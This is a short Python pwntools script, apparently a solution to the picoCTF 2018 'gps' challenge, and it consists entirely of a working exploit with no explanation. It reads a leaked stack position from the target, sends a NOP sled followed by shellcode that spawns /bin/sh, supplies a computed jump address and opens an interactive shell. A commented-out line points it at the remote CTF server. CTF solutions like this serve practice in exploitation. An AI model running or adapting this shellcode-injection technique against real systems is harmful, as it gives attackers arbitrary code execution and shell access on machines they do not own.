#!/usr/bin/env python

import re
from pwn import *

context.update(arch='amd64', os='linux')

r = process("./gps")
# r = remote("2018shell.picoctf.com", 49351)
#pause()
    
data = r.recvuntil("> ")
position = int(re.search("Current position: (0x[0-9a-f]+)\n", data).group(1), 16)
addr = position + 0x500
    
print("Position", hex(position))
print("Addr", hex(addr))
    
print(asm(shellcraft.sh()))
payload = (
    "\x90" * 0x800 +
    asm(shellcraft.sh())
)
    
r.sendline(payload)
r.recvuntil("> ")
    
r.sendline(hex(addr))
r.interactive()
    
r.close()
